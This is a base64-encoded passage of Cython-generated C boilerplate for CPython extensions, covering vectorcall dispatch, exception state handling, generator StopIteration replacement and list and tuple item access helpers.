UsIGt3YXJncyk7CiAgYmFkOgogICAgUHlfREVDUkVGKGFyZ3N0dXBsZSk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgX1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkKICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgdmVjdG9yY2FsbGZ1bmMgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKFB5T2JqZWN0ICpjYWxsYWJsZSkgewogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUoY2FsbGFibGUpOwogICAgI2lmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKQogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChjYWxsYWJsZSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY2FsbGFibGUpOwogICAgfQogICAgI2VuZGlmCiAgICBpZiAoIVB5VHlwZV9IYXNGZWF0dXJlKHRwLCBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGFzc2VydChQeUNhbGxhYmxlX0NoZWNrKGNhbGxhYmxlKSk7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IHRwLT50cF92ZWN0b3JjYWxsX29mZnNldDsKICAgIGFzc2VydChvZmZzZXQgPiAwKTsKICAgIHZlY3RvcmNhbGxmdW5jIHB0cjsKICAgIG1lbWNweSgmcHRyLCAoY2hhciAqKSBjYWxsYWJsZSArIG9mZnNldCwgc2l6ZW9mKHB0cikpOwogICAgcmV0dXJuIHB0cjsKfQogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKQogICNlbmRpZgojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgX25hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7CiAgICBQeV9zc2l6ZV90IG5hcmdzID0gX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKF9uYXJncyk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGlmIChuYXJncyA9PSAwICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX05PQVJHUykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgTlVMTCk7CiAgICB9CiAgICBlbHNlIGlmIChuYXJncyA9PSAxICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX08pKQogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIGFyZ3NbMF0pOwogICAgfQojZW5kaWYKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjEKICAgICNpZiBDWVRIT05fRkFTVF9QWUNDQUxMCiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICBpZiAoa3dhcmdzKSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIG5hcmdzLCBrd2FyZ3MpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxLZXl3b3JkcyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFrd2FyZ3MgJiYgX19QeXhfSVNfVFlQRShmdW5jLCAmUHlNZXRob2REZXNjcl9UeXBlKSkgewogICAgICAgIHJldHVybiBfUHlNZXRob2REZXNjcl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KICAgICNlbmRpZgogICAgI2lmIENZVEhPTl9GQVNUX1BZQ0FMTAogICAgaWYgKFB5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7CiAgICB9CiAgICAjZW5kaWYKICAgICNlbmRpZgogICAgaWYgKGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihmdW5jKTsKICAgICAgICBpZiAoZikgewogICAgICAgICAgICByZXR1cm4gZihmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgIH0KICAgICAgICAjZWxpZiBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgJiYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgICAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpKSB7CiAgICAgICAgICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGYgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmdW5jKTsKICAgICAgICAgICAgaWYgKGYpIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgQ1lUSE9OX1ZFQ1RPUkNBTEwKICAgICAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbChmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgICNlbmRpZgogICAgfQogICAgaWYgKG5hcmdzID09IDApIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwga3dhcmdzKTsKICAgIH0KICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbERpY3QoZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbHNlCiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbmRpZgp9CgoKI2lmICFDWVRIT05fVkVDVE9SQ0FMTCB8fCBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgUHlPYmplY3QgKmF0dHIgPSBQeU9iamVjdF9HZXRBdHRyKGFyZ3NbMF0sIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFhdHRyKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGF0dHIsIGFyZ3MrMSwgbmFyZ3NmIC0gMSk7CiAgICBQeV9ERUNSRUYoYXR0cik7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1VuYm91bmRMb2NhbEVycm9yLCAibG9jYWwgdmFyaWFibGUgJyVzJyByZWZlcmVuY2VkIGJlZm9yZSBhc3NpZ25tZW50IiwgdmFybmFtZSk7Cn0KCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBpbnQgX19QeXhfX0dldEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9HZXRFeGNlcHRpb24oUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKQojZW5kaWYKewogICAgUHlPYmplY3QgKmxvY2FsX3R5cGUgPSBOVUxMLCAqbG9jYWxfdmFsdWUsICpsb2NhbF90YiA9IE5VTEw7CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogICAgbG9jYWxfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uOwogICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7CiAgI2Vsc2UKICAgIGxvY2FsX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlOwogICAgbG9jYWxfdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTsKICAgIGxvY2FsX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrOwogICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IDA7CiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IDA7CiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSAwOwogICNlbmRpZgojZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMAogICAgbG9jYWxfdmFsdWUgPSBQeUVycl9HZXRSYWlzZWRFeGNlcHRpb24oKTsKI2Vsc2UKICAgIFB5RXJyX0ZldGNoKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7CiNlbmRpZgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDAKICAgIGlmIChsaWtlbHkobG9jYWxfdmFsdWUpKSB7CiAgICAgICAgbG9jYWxfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUobG9jYWxfdmFsdWUpOwogICAgICAgIFB5X0lOQ1JFRihsb2NhbF90eXBlKTsKICAgICAgICBsb2NhbF90YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhsb2NhbF92YWx1ZSk7CiAgICB9CiNlbHNlCiAgICBQeUVycl9Ob3JtYWxpemVFeGNlcHRpb24oJmxvY2FsX3R5cGUsICZsb2NhbF92YWx1ZSwgJmxvY2FsX3RiKTsKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgaWYgKHVubGlrZWx5KHRzdGF0ZS0+Y3VyZXhjX3R5cGUpKQojZWxzZQogICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKQojZW5kaWYKICAgICAgICBnb3RvIGJhZDsKICAgIGlmIChsb2NhbF90YikgewogICAgICAgIGlmICh1bmxpa2VseShQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUsIGxvY2FsX3RiKSA8IDApKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgIH0KI2VuZGlmIC8vIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwCiAgICBQeV9YSU5DUkVGKGxvY2FsX3RiKTsKICAgIFB5X1hJTkNSRUYobG9jYWxfdHlwZSk7CiAgICBQeV9YSU5DUkVGKGxvY2FsX3ZhbHVlKTsKICAgICp0eXBlID0gbG9jYWxfdHlwZTsKICAgICp2YWx1ZSA9IGxvY2FsX3ZhbHVlOwogICAgKnRiID0gbG9jYWxfdGI7CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICB7CiAgICAgICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICAgICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlOwogICAgICAgIHRtcF90eXBlID0gTlVMTDsKICAgICAgICB0bXBfdGIgPSBOVUxMOwogICAgICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7CiAgICAgICAgUHlfWERFQ1JFRihsb2NhbF90Yik7CiAgICAgICNlbHNlCiAgICAgICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICAgICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgICAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjazsKICAgICAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSBsb2NhbF90eXBlOwogICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgICAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiOwogICAgICAjZW5kaWYKICAgIH0KICAgICNlbHNlCiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSBsb2NhbF90eXBlOwogICAgdHN0YXRlLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiOwogICAgI2VuZGlmCiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodG1wX3RiKTsKI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwCiAgICBQeUVycl9TZXRIYW5kbGVkRXhjZXB0aW9uKGxvY2FsX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdmFsdWUpOwogICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdGIpOwojZWxzZQogICAgUHlFcnJfU2V0RXhjSW5mbyhsb2NhbF90eXBlLCBsb2NhbF92YWx1ZSwgbG9jYWxfdGIpOwojZW5kaWYKICAgIHJldHVybiAwOwojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8PSAweDAzMEMwMDAwCmJhZDoKICAgICp0eXBlID0gMDsKICAgICp2YWx1ZSA9IDA7CiAgICAqdGIgPSAwOwogICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdmFsdWUpOwogICAgUHlfWERFQ1JFRihsb2NhbF90Yik7CiAgICByZXR1cm4gLTE7CiNlbmRpZgp9CgoKc3RhdGljIHZvaWQgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbihpbnQgaW5fYXN5bmNfZ2VuKSB7CiAgICBQeU9iamVjdCAqZXhjLCAqdmFsLCAqdGIsICpjdXJfZXhjLCAqbmV3X2V4YzsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgaW50IGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPSAwOwogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW5fYXN5bmNfZ2VuKTsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBjdXJfZXhjID0gX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKTsKICAgIGlmIChsaWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHsKICAgICAgICBpZiAoaW5fYXN5bmNfZ2VuICYmIHVubGlrZWx5KF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pKSkgewogICAgICAgICAgICBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgfQogICAgX19QeXhfR2V0RXhjZXB0aW9uKCZleGMsICZ2YWwsICZ0Yik7CiAgICBQeV9YREVDUkVGKGV4Yyk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIG5ld19leGMgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oUHlFeGNfUnVudGltZUVycm9yLCAicyIsCiAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BBc3luY0l0ZXJhdGlvbiIgOgogICAgICAgIGluX2FzeW5jX2dlbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BJdGVyYXRpb24iIDoKICAgICAgICAiZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIik7CiAgICBpZiAoIW5ld19leGMpIHsKICAgICAgICBQeV9YREVDUkVGKHZhbCk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgUHlFeGNlcHRpb25fU2V0Q2F1c2UobmV3X2V4YywgdmFsKTsgLy8gc3RlYWxzIHJlZiB0byB2YWwKICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19SdW50aW1lRXJyb3IsIG5ld19leGMpOwp9CgoKI2lmIENZVEhPTl9WRUNUT1JDQUxMCnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHsKICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdDsKICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKGJ1aWxkZXIsIG4sIGtleSkgIT0gKDApKSByZXR1cm4gLTE7CiAgICBQeV9JTkNSRUYoa2V5KTsKICAgIGFyZ3Nbbl0gPSB2YWx1ZTsKICAgIHJldHVybiAwOwp9CkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikgewogICAgKHZvaWQpX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyOwogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKTsKfQpzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHsKICAgIFB5T2JqZWN0ICpweUtleSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGtleSk7CiAgICBpZiAoIXB5S2V5KSByZXR1cm4gLTE7CiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKHB5S2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7Cn0KI2Vsc2UgLy8gQ1lUSE9OX1ZFQ1RPUkNBTEwKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICoqYXJncywgQ1lUSE9OX1VOVVNFRCBpbnQgbikgewogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIFB5RGljdF9TZXRJdGVtKGJ1aWxkZXIsIGtleSwgdmFsdWUpOwp9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShQeU9iamVjdCAqb2JqKSB7CiAgICBpZiAodW5saWtlbHkob2JqID09IFB5X05vbmUpKQogICAgICAgIG9iaiA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTm9uZTsKICAgIHJldHVybiBfX1B5eF9OZXdSZWYob2JqKTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9HZW5lcmljKFB5T2JqZWN0ICpvLCBQeU9iamVjdCogaikgewogICAgUHlPYmplY3QgKnI7CiAgICBpZiAodW5saWtlbHkoIWopKSByZXR1cm4gTlVMTDsKICAgIHIgPSBQeU9iamVjdF9HZXRJdGVtKG8sIGopOwogICAgUHlfREVDUkVGKGopOwogICAgcmV0dXJuIHI7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfTGlzdF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IHdyYXBhcm91bmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAmJiAhQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICAgUHlfc3NpemVfdCB3cmFwcGVkX2kgPSBpOwogICAgaWYgKHdyYXBhcm91bmQgJiB1bmxpa2VseShpIDwgMCkpIHsKICAgICAgICB3cmFwcGVkX2kgKz0gUHlMaXN0X0dFVF9TSVpFKG8pOwogICAgfQogICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleCh3cmFwcGVkX2ksIFB5TGlzdF9HRVRfU0laRShvKSkpKSB7CiAgICAgICAgUHlPYmplY3QgKnIgPSBQeUxpc3RfR0VUX0lURU0obywgd3JhcHBlZF9pKTsKICAgICAgICBQeV9JTkNSRUYocik7CiAgICAgICAgcmV0dXJuIHI7CiAgICB9CiAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9HZW5lcmljKG8sIFB5TG9uZ19Gcm9tU3NpemVfdChpKSk7CiNlbHNlCiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IHdyYXBhcm91bmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfc3NpemVfdCB3cmFwcGVkX2kgPSBpOwogICAgaWYgKHdyYXBhcm91bmQgJiB1bmxpa2VseShpIDwgMCkpIHsKICAgICAgICB3cmFwcGVkX2kgKz0gUHlUdXBsZV9HRVRfU0laRShvKTsKICAgIH0KICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCBsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgod3JhcHBlZF9pLCBQeVR1cGxlX0dFVF9TSVpFKG8pKSkpIHsKICAgICAgICBQeU9iamVjdCAqciA9IFB5VHVwbGVfR0VUX0lURU0obywgd3JhcHBlZF9pKTsKICAgICAgICBQeV9JTkNSRUYocik7CiAgICAgICAgcmV0dXJuIHI7CiAgICB9CiAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9HZW5lcmljKG8sIFB5TG9uZ19Gcm9tU3NpemVfdChpKSk7CiNlbHNlCiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksIGludCBpc19saXN0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICBpZiAoaXNfbGlzdCB8fCBQeUxpc3RfQ2hlY2tFeGFjdChvKSkgewogICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeUxpc3RfR0VUX1NJWkUobyk7CiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IChsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgobiwgUHlMaXN0X0dFVF9TSVpFKG8pKSkpKSB7CiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBuKTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrRXhhY3